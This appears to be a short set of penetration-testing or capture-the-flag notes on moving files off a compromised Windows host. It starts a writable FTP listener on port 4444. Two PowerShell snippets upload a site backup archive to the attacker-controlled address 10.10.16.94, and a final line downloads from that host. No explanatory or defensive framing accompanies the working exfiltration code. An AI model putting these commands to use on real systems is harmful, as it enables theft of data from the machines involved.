
```sh
python3 -m pyftpdlib -p 4444 -w
```

```
$localFile = "C:\backups\site-backup-2024-12-30.zip"
$ftp = "ftp://10.10.16.94:4444/interesting_file.txt"
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
$webclient.UploadFile($ftp, $localFile)
```

```powershell
$localFile = "C:\backups\site-backup-2024-12-30.zip"
$ftp = "ftp://10.10.16.94:4444/interesting_file.txt"

$ftpRequest = [System.Net.FtpWebRequest]::Create($ftp)
$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftpRequest.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
$ftpRequest.UsePassive = $false
$ftpRequest.UseBinary = $true

[byte[]]$fileContents = [System.IO.File]::ReadAllBytes($localFile)
$ftpRequest.ContentLength = $fileContents.Length

$reqStream = $ftpRequest.GetRequestStream()
$reqStream.Write($fileContents, 0, $fileContents.Length)
$reqStream.Close()

$response = $ftpRequest.GetResponse()
$response.StatusDescription
$response.Close()
```

```
Invoke-WebRequest -Uri http://10.10.16.94:4444/ -OutFile C:\backups\site-backup-2024-12-30.zip
```